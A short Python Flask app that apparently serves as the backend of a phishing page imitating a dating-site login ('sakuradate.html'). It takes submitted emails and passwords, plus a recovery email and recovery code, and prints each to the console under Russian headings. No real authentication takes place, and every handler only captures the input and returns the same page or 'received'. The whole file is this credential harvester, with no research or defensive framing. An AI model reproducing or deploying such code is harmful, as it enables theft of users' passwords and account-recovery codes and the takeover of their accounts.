from flask import Flask, request, render_template, jsonify

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        print("\n=== Данные входа ===")
        print(f"Email: {email}")
        print(f"Password: {password}")
        print("===================")

        return render_template('sakuradate.html')

    return render_template('sakuradate.html')


@app.route('/recover-email', methods=['POST'])
def recover_email():
    email = request.form.get('email')

    print("\n=== Введен email для восстановления ===")
    print(f"Email: {email}")
    print("=====================================")

    return jsonify({'status': 'received'})


@app.route('/recover-code', methods=['POST'])
def recover_code():
    code = request.form.get('code')

    print("\n=== Введен код восстановления ===")
    print(f"Code: {code}")
    print("===============================")

    return jsonify({'status': 'received'})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
